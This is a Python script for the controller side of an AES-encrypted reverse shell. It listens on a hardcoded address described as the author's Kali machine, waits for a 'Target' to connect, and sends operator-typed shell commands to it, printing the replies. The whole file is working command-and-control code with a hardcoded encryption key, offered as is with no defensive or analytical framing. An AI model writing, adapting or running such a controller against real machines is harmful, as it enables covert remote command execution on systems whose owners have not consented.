import os
import socket
import json
import base64
from Crypto.Cipher import AES


SERVER_IP = '192.168.64.8'  # IP of my Kali Linux machine
SERVER_PORT = 8887

#Step 4: Authentication
key = b'\x91)\xdd\xa9\x06\xaa\x8d\xb2\xbd\x7fY\x84! \x99\xcb'


def encrypt(msg):
  cipher = AES.new(key, AES.MODE_EAX)
  nonce = cipher.nonce
  ciphertext, tag = cipher.encrypt_and_digest(msg.encode('ascii'))
  return nonce, ciphertext, tag

def decrypt(nonce, ciphertext, tag):
  cipher = AES.new(key, AES.MODE_EAX, nonce=nonce)
  plaintext = cipher.decrypt(ciphertext)
  try:
    cipher.verify(tag)
    return plaintext.decode('ascii')
  except:
    return False

def send(data):
    nonce, ciphertext, tag = encrypt(data)
    message = {
        'nonce': base64.b64encode(nonce).decode('utf-8'),
        'ciphertext': base64.b64encode(ciphertext).decode('utf-8'),
        'tag': base64.b64encode(tag).decode('utf-8')
    }
    json_data = json.dumps(message)
    client_sock.send(json_data.encode('utf-8'))



def recv_command():
    data = client_sock.recv(1024).decode('utf-8')
    try:
        message = json.loads(data)
        nonce = base64.b64decode(message['nonce'])
        ciphertext = base64.b64decode(message['ciphertext'])
        tag = base64.b64decode(message['tag'])
        decrypted_command = decrypt(nonce, ciphertext, tag)
        if decrypted_command is False:
            print("Decryption failed.")
            return None
        return decrypted_command
    except ValueError as e:
        return False

    
def create_communication():
    while True:
        command = input(f'~{str(client_ip)}>>: ')
        send(command)
        if command == 'quit' or command == 'exit':
            break
        elif command[:3] == 'cd ':
            pass
        elif command == 'clear':
            os.system('clear')
        else:
            result = recv_command()
            print(result)


server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_sock.bind((SERVER_IP, SERVER_PORT))

print('[+] Listening For Incoming Connections....')
server_sock.listen(5)
client_sock, client_ip = server_sock.accept()
print(f'[+] Target Connected From: {str(client_ip)}')

create_communication()